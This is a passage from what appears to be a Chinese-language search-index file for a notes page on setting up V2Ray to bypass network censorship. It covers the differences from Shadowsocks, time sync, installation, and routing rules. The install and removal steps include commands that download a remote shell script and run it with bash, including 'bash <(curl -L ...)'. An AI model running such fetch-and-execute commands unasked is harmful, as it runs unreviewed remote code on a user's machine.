\u7684\u5ba2\u6237\u7aef\u90fd\u662f\u81ea\u5df1\u91cd\u65b0\u5b9e\u73b0\u4e86\u4e00\u904d Shadowsocks \u534f\u8bae\u3002\u672c\u6587\u7684\u5185\u5bb9\u77ed\u671f\u5185\u4e0d\u6d89\u53ca\u56fe\u5f62\u5ba2\u6237\u7aef\u7684\u4f7f\u7528\u3002 \u5206\u6d41\uff1a\u4e5f\u8bb8\u5927\u5bb6\u7b2c\u4e00\u53cd\u5e94\u662f PAC\uff0c\u5b9e\u9645\u4e0a\u65e0\u8bba\u662f Shadowsocks (\u7279\u6307 Shadowsocks-libev) \u8fd8\u662f V2Ray \u672c\u8eab\u4e0d\u652f\u6301 PAC\uff0c\u90fd\u662f\u5ba2\u6237\u7aef\u52a0\u8fdb\u6765\u7684\uff1bShadowsocks \u7684\u5206\u6d41\u4f7f\u7528 ACL\uff0cV2Ray \u4f7f\u7528\u81ea\u5df1\u5b9e\u73b0\u7684\u8def\u7531\u529f\u80fd\uff0c\u5b70\u4f18\u5b70\u52a3\u53ea\u662f\u4ec1\u8005\u667a\u8005\u7684\u95ee\u9898\u3002 \u5206\u4eab\u94fe\u63a5/\u4e8c\u7ef4\u7801\uff1aV2Ray \u4e0d\u50cf Shadowsocks \u90a3\u6837\u6709\u7edf\u4e00\u89c4\u5b9a\u7684 URL \u683c\u5f0f\uff0c\u6240\u4ee5\u5404\u4e2a V2Ray \u56fe\u5f62\u5ba2\u6237\u7aef\u7684\u5206\u4eab\u94fe\u63a5/\u4e8c\u7ef4\u7801\u4e0d\u4e00\u5b9a\u901a\u7528\u3002 \u52a0\u5bc6\u65b9\u5f0f\uff1aV2Ray (\u7279\u6307 VMess \u534f\u8bae) \u4e0d\u50cf Shadowsocks \u90a3\u6837\u770b\u91cd\u5bf9\u52a0\u5bc6\u65b9\u5f0f\u7684\u9009\u62e9\uff0c\u5e76\u4e14 VMess \u7684\u52a0\u5bc6\u65b9\u5f0f\u662f\u7531\u5ba2\u6237\u7aef\u6307\u5b9a\u7684\uff0c\u670d\u52a1\u5668\u81ea\u9002\u5e94\u3002 \u65f6\u95f4\uff1a\u4f7f\u7528 V2Ray \u8981\u4fdd\u8bc1\u65f6\u95f4\u51c6\u786e\uff0c\u56e0\u4e3a\u8fd9\u662f\u4e3a\u4e86\u5b89\u5168\u8bbe\u8ba1\u7684\u3002 \u5bc6\u7801\uff1aV2Ray(VMesss) \u53ea\u6709 id\uff08\u4f7f\u7528 UUID \u7684\u683c\u5f0f\uff09\uff0c\u4f5c\u7528\u7c7b\u4f3c\u4e8e Shadowsocks \u7684\u5bc6\u7801\uff0c\u4f46\u968f\u673a\u6027\u8fdc\u597d\u4e8e Shadowsocks \u7684\u5bc6\u7801\uff0c\u53ea\u662f\u4e0d\u592a\u65b9\u4fbf\u8bb0\u5fc6(\u5b89\u5168\u548c\u65b9\u4fbf\u7684\u77db\u76fe)\u3002 UDP \u8f6c\u53d1\uff1aVMess \u662f\u57fa\u4e8e TCP \u7684\u534f\u8bae\uff0c\u5bf9\u4e8e UDP \u5305 V2Ray \u4f1a\u8f6c\u6210 TCP \u518d\u4f20\u8f93\u7684\uff0c\u5373 UDP over TCP\u3002\u8981 UDP \u8f6c\u53d1\u529f\u80fd\u5728\u5ba2\u6237\u7aef\u7684 socks \u534f\u8bae\u4e2d\u5f00\u542f UDP \u5373\u53ef\u3002 \u8def\u7531\u5668\u7ffb\u5899\uff1a\u5b9e\u9645\u4e0a\u5b83\u4eec\u5e76\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u4e0d\u8981\u4ee5\u4e3a\u6ca1\u6709\u63d2\u4ef6\u5c31\u4e0d\u80fd\u5728\u8def\u7531\u5668\u4e0a\u7528\uff0c\u770b\u4e8b\u7269\u8bf7\u770b\u672c\u8d28\u3002 Shadowsocks: https://github.com/shadowsocks/shadowsocks/tree/master \u51c6\u5907\u5de5\u4f5c \uf0c1 \u65f6\u95f4\u662f\u5426\u51c6\u786e \uf0c1 V2Ray \u5bf9\u4e8e\u65f6\u95f4\u6709\u6bd4\u8f83\u4e25\u683c\u7684\u8981\u6c42\uff0c\u8981\u6c42\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u65f6\u95f4\u5dee\u7edd\u5bf9\u503c\u4e0d\u80fd\u8d85\u8fc7 90 \u79d2 \uff0c\u6240\u4ee5\u4e00\u5b9a\u8981\u4fdd\u8bc1\u65f6\u95f4\u8db3\u591f\u51c6\u786e\u3002\u8fd8\u597d V2Ray \u5e76\u4e0d\u8981\u6c42\u65f6\u533a\u4e00\u81f4\u3002\u6bd4\u5982\u8bf4\u81ea\u4e2a\u513f\u7535\u8111\u4e0a\u7684\u65f6\u95f4\u662f\u5317\u4eac\u65f6\u95f4\uff08\u4e1c 8 \u533a\uff092017-07-31 12:08:31\uff0c\u4f46\u662f VPS \u4e0a\u7684\u65f6\u533a\u662f\u4e1c 9 \u533a\uff0c\u6240\u4ee5 VPS \u4e0a\u7684\u65f6\u95f4\u5e94\u8be5\u662f 2017-07-31 13:07:01 \u5230 2017-07-31 13:10:01 \u4e4b\u95f4\u624d\u80fd\u6b63\u5e38\u4f7f\u7528 V2Ray\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u81ea\u884c\u6539\u6210\u81ea\u5df1\u60f3\u8981\u7684\u65f6\u533a\u3002 Linux \u7248\u672c\u7684\u95ee\u9898 \uf0c1 \u611f\u8c22 Golang \u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u7684\u7279\u6027\u548c\u539f\u4f5c\u8005\u7684\u7cbe\u5fc3\u8bbe\u8ba1\uff0cV2Ray \u53ef\u4ee5\u4e0d\u4f9d\u8d56\u5176\u5b83\u8f6f\u4ef6\uff08\u5e93\uff09\u800c\u8fd0\u884c\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u8de8\u5e73\u53f0\u652f\u6301\uff08\u5982\uff1a Windows, Linux, MacOS, BSD \u7b49\uff09\u3002\u4f46\u662f\u7531\u4e8e\u65b0\u624b\u5728\u5b66\u4e60\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u9047\u5230\u5404\u79cd\u95ee\u9898\uff0c\u5374\u7f3a\u4e4f\u76f8\u5e94\u7684\u89e3\u51b3\u95ee\u9898\u7684\u80fd\u529b\uff0c\u56e0\u6b64\u5728 VPS \u4e0a\u5efa\u8bae\u4f7f\u7528 Debian 9.x, Debian 10 \u4ee5\u4e0a\u6216 Ubuntu 18.04 \u53ca\u4ee5\u4e0a\u7684 Linux \u53d1\u884c\u7248\u3002\u8bf7\u4e0d\u8981\u8ff7\u4fe1\u67d0\u4e2a\uff08\u4e9b\uff09\u201c\u6700\u7a33\u5b9a\u201d\u7684 Linux \u53d1\u884c\u7248\u3002 \u5b89\u88c5 \uf0c1 \u4e0e Shadowsocks \u4e0d\u540c\uff0c\u4ece\u8f6f\u4ef6\u4e0a V2Ray \u4e0d\u533a\u5206\u670d\u52a1\u5668\u7248\u548c\u5ba2\u6237\u7aef\u7248\uff0c\u4e5f\u5c31\u662f\u8bf4\u5728\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u8fd0\u884c\u7684 V2Ray \u662f\u540c\u4e00\u4e2a\u8f6f\u4ef6\uff0c\u533a\u522b\u53ea\u662f\u914d\u7f6e\u6587\u4ef6\u7684\u4e0d\u540c\u3002 \u5728 Linux \u64cd\u4f5c\u7cfb\u7edf\uff0c V2Ray \u7684\u5b89\u88c5\u6709\u811a\u672c\u5b89\u88c5\u3001\u624b\u52a8\u5b89\u88c5\u3001\u7f16\u8bd1\u5b89\u88c5 3 \u79cd\u65b9\u5f0f\uff0c\u9009\u62e9\u5176\u4e2d\u4e00\u79cd\u5373\u53ef\uff0c\u672c\u6587\u4ec5\u63d0\u4f9b\u4f7f\u7528\u4f7f\u7528\u811a\u672c\u5b89\u88c5\u7684\u65b9\u6cd5\uff0c\u5e76\u4ec5\u63a8\u8350\u4f7f\u7528\u811a\u672c\u5b89\u88c5\uff0c\u8be5\u811a\u672c\u7531 V2Ray \u5b98\u65b9\u63d0\u4f9b\u3002\u8be5\u811a\u672c\u4ec5\u53ef\u4ee5\u5728 Debian \u7cfb\u5217\u6216\u8005\u652f\u6301 Systemd \u7684 Linux \u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u3002 $ curl -O https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh $ bash install-release.sh # \u8bbe\u7f6e\u5f00\u673a\u81ea\u81ea\u52a8 $ systemctl enable v2ray # \u542f\u52a8V2Ray \u8bf7\u63d0\u524d\u914d\u7f6e\u597dv2ray.config $ systemctl start v2ray # \u67e5\u770bV2Ray\u8fd0\u884c\u60c5\u51b5 $ systemctl status v2ray \u914d\u7f6e \uf0c1 \u5173\u4e8e V2ray \u914d\u7f6e\uff0c\u8bf7\u53c2\u8003 v2ray-examples \u5185\u7684\u793a\u4f8b\u3002 \u56e0\u4e3a\u6ca1\u6709\u57df\u540d\u548c\u7f51\u7ad9\u8bc1\u4e66\uff0c\u6211\u53ea\u80fd\u4f7f\u7528VMess-HTTP\uff0c\u8fd9\u79cd\u7b80\u5355\u7684\u4f2a\u88c5\u6211\u7528\u4e86\u8fd1\u4e24\u5e74\u4e5f\u6ca1\u6709\u88ab\u5c01\u8fc7\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u4e2a\u4eba\u4f7f\u7528\u6d41\u91cf\u5c11\uff0c\u4e5f\u6ca1\u6709\u5e72\u574f\u4e8b\u3002 \u5347\u7ea7\u66f4\u65b0 \uf0c1 \u5728 VPS\uff0c\u91cd\u65b0\u6267\u884c\u4e00\u904d\u5b89\u88c5\u811a\u672c\u5c31\u53ef\u4ee5\u66f4\u65b0\u4e86\uff0c\u5728\u66f4\u65b0\u8fc7\u7a0b\u4e2d\u4f1a\u81ea\u52a8\u91cd\u542f V2Ray\uff0c\u914d\u7f6e\u6587\u4ef6\u4fdd\u6301\u4e0d\u53d8\u3002 $ bash install-release.sh V2Ray \u7684\u66f4\u65b0\u7b56\u7565\u662f\u5feb\u901f\u8fed\u4ee3\uff0c\u6bcf\u5468\u66f4\u65b0(\u65e0\u610f\u5916\u7684\u60c5\u51b5\u4e0b)\u3002\u7248\u672c\u53f7\u7684\u683c\u5f0f\u662f vX.Y.Z\uff0c\u5982 v2.44.0\u3002v \u662f\u56fa\u5b9a\u7684\u5b57\u6bcd v\uff0cversion \u7684\u9996\u5b57\u6bcd\uff1bX\u3001Y\u3001Z \u90fd\u662f\u6570\u5b57\uff0cX \u662f\u5927\u7248\u672c\u53f7\uff0c\u6bcf\u5e74\u66f4\u65b0\u4e00\u4e2a\u5927\u7248\u672c(\u73b0\u5728\u662f v4.Y.Z\uff0cV2Ray \u5df2\u7ecf\u8d70\u5230\u4e86\u7b2c\u56db\u4e2a\u5e74\u5934)\uff0cY \u662f\u5c0f\u7248\u672c\uff0c\u6bcf\u5468\u4e94\u66f4\u65b0\u4e00\u4e2a\u5c0f\u7248\u672c\u3002Z \u662f\u533a\u5206\u6b63\u5f0f\u7248\u548c\u6d4b\u8bd5\u7248\uff0cZ \u662f 0 \u4ee3\u8868\u7740\u662f\u6b63\u5f0f\u7248\uff0c\u4e0d\u662f 0 \u8bf4\u660e\u662f\u6d4b\u8bd5\u7248\u3002\u4f8b\u5982\uff0cv4.7.0 \u662f\u6b63\u5f0f\u7248\uff0cv4.7.1 \u662f\u6d4b\u8bd5\u7248\uff0c\u5efa\u8bae\u53ea\u4f7f\u7528\u6b63\u5f0f\u7248\uff0c\u4e0d\u624b\u52a8\u6307\u5b9a\u7684\u60c5\u51b5\u4e0b V2Ray \u7684\u5b89\u88c5\u811a\u672c\u4e5f\u53ea\u4f1a\u5b89\u88c5\u6700\u65b0\u7684\u6b63\u5f0f\u7248\u3002 \u79fb\u9664 \uf0c1 # bash <(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh) --remove \u7b2c\u4e09\u65b9\u56fe\u5f62\u5ba2\u6237\u7aef \uf0c1 V2rayN : V2RayN \u662f\u4e00\u4e2a\u57fa\u4e8e V2Ray \u5185\u6838\u7684 Windows \u5ba2\u6237\u7aef\u3002 Qv2ray : \u8de8\u5e73\u53f0 V2Ray \u5ba2\u6237\u7aef\uff0c\u652f\u6301 Linux\u3001Windows\u3001macOS\uff0c\u53ef\u901a\u8fc7\u63d2\u4ef6\u7cfb\u7edf\u652f\u6301 SSR / Trojan / Trojan-Go / NaiveProxy \u7b49\u534f\u8bae\u3002 SagerNet : SagerNet \u662f\u4e00\u4e2a\u57fa\u4e8e V2Ray \u7684 Android \u901a\u7528\u4ee3\u7406\u5e94\u7528\u3002 v2rayNG : \u4e00\u6b3e\u5b89\u5353V2Ray\u5ba2\u6237\u7aef\uff0c\u652f\u6301 Xray core \u548c v2fly core\u3002 \u8def\u7531\u89c4\u5219 \uf0c1 V2Ray \u5185\u5efa\u4e86\u4e00\u4e2a\u8def\u7531\u6a21\u5757\uff0c\u53ef\u4ee5\u5c06\u5165\u7ad9\u6570\u636e\u6309\u9700\u6c42\u7531\u4e0d\u540c\u7684\u51fa\u7ad9\u8fde\u63a5\u53d1\u51fa\uff0c\u4ee5\u8fbe\u5230\u6309\u9700\u4ee3\u7406\u7684\u76ee\u7684\u3002\u8fd9\u4e00\u529f\u80fd\u7684\u5e38\u89c1\u7528\u6cd5\u662f\u5206\u6d41\u56fd\u5185\u5916\u6d41\u91cf\u3002V2Ray \u53ef\u4ee5\u901a\u8fc7\u5185\u90e8\u673a\u5236\u5224\u65ad\u4e0d\u540c\u56fd\u5bb6\u6216\u5730\u533a\u7684\u6d41\u91cf\uff0c\u7136\u540e\u5c06\u5b83\u4eec\u53d1\u9001\u5230\u4e0d\u540c\u7684\u51fa\u7ad9\u4ee3\u7406\u3002 \u5728\u4e0b\u8f7d V2Ray \u7684\u65f6\u5019\uff0c\u4e0b\u8f7d\u7684\u538b\u7f29\u5305\u6709\u4e00\u4e2a geosite.dat \u3002\u8fd9\u4e2a\u6587\u4ef6\u662f\u5728\u8def\u7531\u529f\u80fd\u91cc\u7528\u5230\u7684\uff0c\u6587\u4ef6\u5185\u7f6e\u4e86\u8bb8\u591a \u5e38\u89c1\u7684\u7f51\u7ad9\u57df\u540d \u3002\u4f7f\u7528\u65b9\u5f0f\uff1a geosite:listname \uff0c\u5982 geosite:google \u8868\u793a\u5bf9 domain-list-community \u9879\u76ee data \u76ee\u5f55\u91cc\u7684 google \u6587\u4ef6\u5185\u5305\u542b\u7684\u57df\u540d\uff0c\u8fdb\u884c\u8def\u7531\u7b5b\u9009\u6216 DNS \u7b5b\u9009\u3002 Block (\u963b\u6b62)\uff1a \u62e6\u622a\u5411\u5916\u53d1\u9001\u7684\u8fde\u63a5\u8bf7\u6c42\uff0c\u7981\u6b62\u8fde\u7f51\u3002 Direct (\u76f4\u8fde)\uff1a \u76f4\u63a5\u8bbf\u95ee\u5916\u90e8\u7f51\u7edc\uff0c\u4e0d\u8d70\u4ee3\u7406\u3002 Proxy (\u4ee3\u7406)\uff1a \u5141\u8bb8\u901a\u8fc7\u4ee3\u7406\u8fde\u63a5\u4e0a\u7f51\u3002 Proxy(\u4ee3\u7406)\u7684Domain\u89c4\u5219: github.com, githubassets.com, githubusercontent.com, # \u4e0b\u4e00\u884c\u8c37\u6b4c\u4ea7\u54c1\u56fe\u6807, googleusercontent.com Direct(\u76f4\u8fde)\u7684Domain\u89c4\u5219: postman.com, domain:aws.amazon.com, domain:amazonaws.com, adblockplus.org, safesugar.net, #\u3010\u4ee5\u4e0b\u5168\u90e8\u662fgeo\u9884\u5b9a\u4e49\u57df\u540d\u5217\u8868\u3011, # \u4e0b\u4e00\u884c\u662f\u6240\u6709\u79c1\u6709\u57df\u540d, geosite:private, # \u4e0b\u4e00\u884c\u5305\u542b\u5e38\u89c1\u5927\u9646\u7ad9\u70b9\u57df\u540d\u548cCNNIC\u7ba1\u7406\u7684\u5927\u9646\u57df\u540d\uff0c\u5373geolocation-cn\u548ctld-cn\u7684\u5408\u96c6, geosite:cn, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709Adobe\u65d7\u4e0b\u57df\u540d, geosite:adobe, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709Adobe\u6b63\u7248\u6fc0\u6d3b\u57df\u540d, geosite:adobe-activation, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709\u5fae\u8f6f\u65d7\u4e0b\u57df\u540d, geosite:microsoft, # \u4e0b\u4e00\u884c\u5305\u542b\u5fae\u8f6fmsn\u76f8\u5173\u57df\u540d\u5c11\u6570\u4e0e\u4e0a\u4e00\u884c\u5fae\u8f6f\u5217\u8868\u91cd\u590d, geosite:msn, # \u4e0b\u4e00\u884c\u5305\u542b\u6240\u6709\u82f9\u679c\u65d7\u4e0b\u57df\u540d, geosite:apple, # \u4e0b\u4e00\u884c\u5305\u542b\u53ef\u76f4\u8fde\u8bbf\u95ee\u8c37\u6b4c\u7f51\u5740\uff0c\u9700\u8981\u66ff\u6362\u4e3a\u52a0\u5f3a\u7248GEO\uff0c\u5426\u5219\u5220\u9664\u6b64\u884c, geosite:google-cn, # \u4e0b\u4e00\u884c\u5305\u542b\u53ef\u76f4\u8fde\u8bbf\u95ee\u82f9\u679c\u7f51\u5740\uff0c\u9700\u8981\u66ff\u6362\u4e3a\u52a0\u5f3a\u7248GEO\uff0c\u5426\u5219\u5220\u9664\u6b64\u884c, geosite:apple-cn Direct(\u76f4\u8fde)\u7684IP\u89c4\u5219: # \u4e2d\u56fd\u5927\u9646 IP \u5730\u5740 geoip:cn, # \u6240\u6709\u79c1\u6709\u5730\u5740\uff0c\u5982 127.0.0.1 geoip:private Block(\u963b\u6b62)\u7684Domain\u89c4\u5219: # \u5305\u542b\u4e86\u5e38\u89c1\u7684\u5e7f\u544a\u57df\u540d\uff0c\u4ee5\u53ca\u5e7f\u544a\u63d0\u4f9b\u5546\u7684\u57df\u540d\u3002 geosite:category-ads-all \u8be6\u7ec6\u89c4\u5219\u53c2\u8003 Routing \u8def\u7531 \u540c\u4e8b\u63a8\u8350\u7684VPN \uf0c1 \u540c\u4e8b\u63a8\u8350\u7684VPN\uff0c\u672c\u4eba\u5e76\u6ca1\u6709\u7528\u8fc7\uff0c\u53ea\u6b64\u8bb0\u5f55\uff0c\u4e0d\u53d1\u8868\u610f\u89c1\u3002 vpnclient \u5feb\u8fdevpn","title":"V2Ray"},{"location":"tool/v2ray/#v2ray","text":"A platform for building proxies to bypass network restrictions.","title":"v2ray"},{"location":"tool/v2ray/#introduction","text":"V2Ray \u662f Project V \u4e0b\u7684\u4e00\u4e2a\u5de5\u5177\u3002Project V \u662f\u4e00\u4e2a\u5305\u542b\u4e00\u7cfb\u5217\u6784\u5efa\u7279\u5b9a\u7f51\u7edc\u73af\u5883\u5de5\u5177\u7684\u9879\u76ee\uff0c\u800c V2Ray \u5c5e\u4e8e\u6700\u6838\u5fc3\u7684\u4e00\u4e2a\u3002 \u5b98\u65b9\u4e2d\u4ecb\u7ecd Project V \u63d0\u4f9b\u4e86\u5355\u4e00\u7684\u5185\u6838\u548c\u591a\u79cd\u754c\u9762\u64cd\u4f5c\u65b9\u5f0f\u3002\u5185\u6838\uff08V2Ray\uff09\u7528\u4e8e\u5b9e\u9645\u7684\u7f51\u7edc\u4ea4\u4e92\u3001\u8def\u7531\u7b49\u9488\u5bf9\u7f51\u7edc\u6570\u636e\u7684\u5904\u7406\uff0c\u800c\u5916\u56f4\u7684\u7528\u6237\u754c\u9762\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u65b9\u4fbf\u76f4\u63a5\u7684\u64cd\u4f5c\u6d41\u7a0b \u3002\u4e0d\u8fc7\u4ece\u65f6\u95f4\u4e0a\u6765\u8bf4\uff0c\u5148\u6709 V2Ray \u624d\u6709 Project V\u3002 \u5982\u679c\u8fd8\u662f\u4e0d\u7406\u89e3\uff0c\u90a3\u4e48\u7b80\u5355\u5730\u8bf4\uff0cV2Ray \u662f\u4e00\u4e2a\u4e0e Shadowsocks \u7c7b\u4f3c\u7684\u4ee3\u7406\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7528\u6765\u79d1\u5b66\u4e0a\u7f51\uff08\u7ffb\u5899\uff09\u5b66\u4e60\u56fd\u5916\u5148\u8fdb\u79d1\u5b66\u6280\u672f\u3002 V2Ray \u7528\u6237\u624b\u518c: https://www.v2fly.org/ V2Ray \u9879\u76ee\u5730\u5740: https://github.com/v2fly/v2ray-core \u672a\u8fc1\u79fb\u524d\u7684\u5730\u5740: https://github.com/v2ray/v2ray-core V2Ray \u914d\u7f6e\u6307\u5357: https://github.com/ToutyRater/v2ray-guide","title":"\u7b80\u4ecb"},{"location":"tool/v2ray/#difference-with-shadowsocks","text":"Shadowsocks \u662f\u4e00\u4e2a\u7eaf\u7cb9\u7684\u4ee3\u7406\u5de5\u5177\uff0c\u800c V2Ray \u5b9a\u4f4d\u4e3a\u4e00\u4e2a\u5e73\u53f0\uff0c\u4efb\u4f55\u5f00\u53d1\u8005\u90fd\u53ef\u4ee5\u5229\u7528 V2Ray \u63d0\u4f9b\u7684\u6a21\u5757\u5f00\u53d1\u51fa\u65b0\u7684\u4ee3\u7406\u8f6f\u4ef6\u3002 \u4e86\u89e3 Shadowsocks \u5386\u53f2\u7684\u540c\u5b66\u90fd\u77e5\u9053\uff0cShadowsocks \u662f clowwindy \u5f00\u53d1\u7684\u81ea\u7528\u7684\u8f6f\u4ef6\uff0c\u5f00\u53d1\u7684\u521d\u8877\u53ea\u662f\u4e3a\u4e86\u8ba9\u81ea\u5df1\u80fd\u591f\u7b80\u5355\u9ad8\u6548\u5730\u79d1\u5b66\u4e0a\u7f51\uff0c\u81ea\u5df1\u4f7f\u7528\u4e86\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u540e\u89c9\u5f97\u4e0d\u9519\u624d\u5171\u4eab\u51fa\u6765\u7684\u3002V2Ray \u662f clowwindy \u88ab\u559d\u8336\u4e4b\u540e V2Ray \u9879\u76ee\u7ec4\u4e3a\u8868\u793a\u6297\u8bae\u5f00\u53d1\u7684\uff0c\u4e00\u5f00\u59cb\u5c31\u81f4\u529b\u4e8e\u8ba9\u5927\u5bb6\u66f4\u597d\u66f4\u5feb\u7684\u79d1\u5b66\u4e0a\u7f51\u3002 \u7531\u4e8e\u51fa\u751f\u65f6\u7684\u5386\u53f2\u80cc\u666f\u4e0d\u540c\uff0c\u5bfc\u81f4\u4e86\u5b83\u4eec\u6027\u683c\u7279\u70b9\u7684\u5dee\u5f02\u3002 \u7b80\u5355\u6765\u8bf4\uff0cShadowsocks \u529f\u80fd\u5355\u4e00\uff0cV2Ray \u529f\u80fd\u5f3a\u5927\u3002\u542c\u8d77\u6765\u4f3c\u4e4e\u6709\u70b9\u8d2c\u4f4e Shadowsocks \u5462\uff1f\u5f53\u7136\u4e0d\uff01\u6362\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0cShadowsocks \u7b80\u5355\u597d\u4e0a\u624b\uff0cV2Ray \u590d\u6742\u914d\u7f6e\u591a\u3002 \u7531\u4e8e\u8bb8\u591a V2Ray \u7528\u6237\u90fd\u6709\u4f7f\u7528\u8fc7 Shadowsocks \u7684\u7ecf\u9a8c\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u6309\u7167\u4f7f\u7528 Shadowsocks \u90a3\u6837\u4f7f\u7528\u3002\u4f46\u662f V2Ray \u8fd8\u662f\u548c Shadowsocks \u4e0d\u592a\u4e00\u6837\uff0c\u6240\u4ee5\u6211\u5927\u6982\u8bf4\u4e00\u4e0b\u4f7f\u7528\u4e0a\u7684\u5dee\u5f02\u3002\u8bf7\u6ce8\u610f\uff0c\u5dee\u5f02\u4e0d\u4ee3\u8868\u597d\u574f\u6216\u4f18\u52a3\uff0c\u5982\u679c\u4e00\u4e2a\u4e8b\u7269\u5fc5\u987b\u62e5\u6709\u5176\u4ed6\u540c\u7c7b\u6240\u62e5\u6709\u7684\u4e1c\u897f\uff0c\u90a3\u4e48\u5b83\u4e5f\u5c31\u6ca1\u6709\u4e86\u5b58\u5728\u7684\u610f\u4e49\u3002 \u5ba2\u6237\u7aef\uff1aV2Ray \u672c\u8eab\u53ea\u662f\u4e00\u4e2a\u5185\u6838\uff0cV2Ray \u4e0a\u7684\u56fe\u5f62\u5ba2\u6237\u7aef\u5927\u591a\u662f\u8c03\u7528 V2Ray \u5185\u6838\u5957\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\u7684\u5916\u58f3\uff0c\u7c7b\u4f3c\u4e8e Linux \u5185\u6838\u548c Linux \u64cd\u4f5c\u7cfb\u7edf\u7684\u5173\u7cfb\uff1b\u800c Shadowsocks \u7684\u5ba2\u6237\u7aef\u90fd\u662f\u81ea\u5df1\u91cd\u65b0\u5b9e\u73b0\u4e86\u4e00\u904d Shadowsocks \u534f\u8bae\u3002\u672c\u6587\u7684\u5185\u5bb9\u77ed\u671f\u5185\u4e0d\u6d89\u53ca\u56fe\u5f62\u5ba2\u6237\u7aef\u7684\u4f7f\u7528\u3002 \u5206\u6d41\uff1a\u4e5f\u8bb8\u5927\u5bb6\u7b2c\u4e00\u53cd\u5e94\u662f PAC\uff0c\u5b9e\u9645\u4e0a\u65e0\u8bba\u662f Shadowsocks (\u7279\u6307 Shadowsocks-libev) \u8fd8\u662f V2Ray \u672c\u8eab\u4e0d\u652f\u6301 PAC\uff0c\u90fd\u662f\u5ba2\u6237\u7aef\u52a0\u8fdb\u6765\u7684\uff1bShadowsocks \u7684\u5206\u6d41\u4f7f\u7528 ACL\uff0cV2Ray \u4f7f\u7528\u81ea\u5df1\u5b9e\u73b0\u7684\u8def\u7531\u529f\u80fd\uff0c\u5b70\u4f18\u5b70\u52a3\u53ea\u662f\u4ec1\u8005\u667a\u8005\u7684\u95ee\u9898\u3002 \u5206\u4eab\u94fe\u63a5/\u4e8c\u7ef4\u7801\uff1aV2Ray \u4e0d\u50cf Shadowsocks \u90a3\u6837\u6709\u7edf\u4e00\u89c4\u5b9a\u7684 URL \u683c\u5f0f\uff0c\u6240\u4ee5\u5404\u4e2a V2Ray \u56fe\u5f62\u5ba2\u6237\u7aef\u7684\u5206\u4eab\u94fe\u63a5/\u4e8c\u7ef4\u7801\u4e0d\u4e00\u5b9a\u901a\u7528\u3002 \u52a0\u5bc6\u65b9\u5f0f\uff1aV2Ray (\u7279\u6307 VMess \u534f\u8bae) \u4e0d\u50cf Shadowsocks \u90a3\u6837\u770b\u91cd\u5bf9\u52a0\u5bc6\u65b9\u5f0f\u7684\u9009\u62e9\uff0c\u5e76\u4e14 VMess \u7684\u52a0\u5bc6\u65b9\u5f0f\u662f\u7531\u5ba2\u6237\u7aef\u6307\u5b9a\u7684\uff0c\u670d\u52a1\u5668\u81ea\u9002\u5e94\u3002 \u65f6\u95f4\uff1a\u4f7f\u7528 V2Ray \u8981\u4fdd\u8bc1\u65f6\u95f4\u51c6\u786e\uff0c\u56e0\u4e3a\u8fd9\u662f\u4e3a\u4e86\u5b89\u5168\u8bbe\u8ba1\u7684\u3002 \u5bc6\u7801\uff1aV2Ray(VMesss) \u53ea\u6709 id\uff08\u4f7f\u7528 UUID \u7684\u683c\u5f0f\uff09\uff0c\u4f5c\u7528\u7c7b\u4f3c\u4e8e Shadowsocks \u7684\u5bc6\u7801\uff0c\u4f46\u968f\u673a\u6027\u8fdc\u597d\u4e8e Shadowsocks \u7684\u5bc6\u7801\uff0c\u53ea\u662f\u4e0d\u592a\u65b9\u4fbf\u8bb0\u5fc6(\u5b89\u5168\u548c\u65b9\u4fbf\u7684\u77db\u76fe)\u3002 UDP \u8f6c\u53d1\uff1aVMess \u662f\u57fa\u4e8e TCP \u7684\u534f\u8bae\uff0c\u5bf9\u4e8e UDP \u5305 V2Ray \u4f1a\u8f6c\u6210 TCP \u518d\u4f20\u8f93\u7684\uff0c\u5373 UDP over TCP\u3002\u8981 UDP \u8f6c\u53d1\u529f\u80fd\u5728\u5ba2\u6237\u7aef\u7684 socks \u534f\u8bae\u4e2d\u5f00\u542f UDP \u5373\u53ef\u3002 \u8def\u7531\u5668\u7ffb\u5899\uff1a\u5b9e\u9645\u4e0a\u5b83\u4eec\u5e76\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u4e0d\u8981\u4ee5\u4e3a\u6ca1\u6709\u63d2\u4ef6\u5c31\u4e0d\u80fd\u5728\u8def\u7531\u5668\u4e0a\u7528\uff0c\u770b\u4e8b\u7269\u8bf7\u770b\u672c\u8d28\u3002 Shadowsocks: https://github.com/shadowsocks/shadowsocks/tree/master","title":"V2Ray \u8ddf Shadowsocks \u6709\u4ec0\u4e48\u533a\u522b"},{"location":"tool/v2ray/#preparation","text":"","title":"\u51c6\u5907\u5de5\u4f5c"},{"location":"tool/v2ray/#synchronised-time","text":"V2Ray \u5bf9\u4e8e\u65f6\u95f4\u6709\u6bd4\u8f83\u4e25\u683c\u7684\u8981\u6c42\uff0c\u8981\u6c42\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u65f6\u95f4\u5dee\u7edd\u5bf9\u503c\u4e0d\u80fd\u8d85\u8fc7 90 \u79d2 \uff0c\u6240\u4ee5\u4e00\u5b9a\u8981\u4fdd\u8bc1\u65f6\u95f4\u8db3\u591f\u51c6\u786e\u3002\u8fd8\u597d V2Ray 